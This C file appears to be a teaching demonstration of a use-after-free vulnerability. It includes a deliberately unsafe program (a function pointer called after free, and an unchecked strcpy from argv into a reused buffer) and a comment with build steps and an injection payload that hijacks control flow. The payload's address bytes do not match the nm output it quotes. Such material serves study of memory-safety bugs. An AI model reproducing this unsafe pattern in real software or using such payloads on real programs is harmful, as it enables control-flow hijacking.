/* THis example is a bit less complicated than the stack smashing one.
 * First you need to compile the executable statically to have a deterministic
 * and easy to identify address for security_critical_function:
 * gcc use-after-free.c -g -o use-after-free -static
 *
 * then use nm to find that address:
 * nm use-after-free | grep security_critical_function
 *
 * on my computer I get:
 * 0000000000401bc1 T security_critical_function
 *
 * Then we can craft and inject our payload:
 * echo -e "\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\xb1\x1c\x40\x00\x00\x00\x00\x00" | xargs --null -t -n1 ./use-after-free
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef struct {
    double member1;
    double member2;
    void (*member3)(int);
} my_struct;

void print_hello(int x) {
    printf("Hello, parameter: %d\n", x);
}

void security_critical_function() {
    printf("Launching nukes!\n");
    /* ... */
}

int main(int argc, char **argv) {

    /* allocate and init ms */
    my_struct *ms = malloc(sizeof(my_struct));
    ms->member1 = 42.0; ms->member2 = 42.0;
    ms->member3 = &print_hello;

    /* call the function pointer */
    ms->member3(12);

    free(ms);

    char *buffer = malloc(12);
    strcpy(buffer, argv[1]);

    ms->member3(12); // Oopsie!
    exit(0);
}

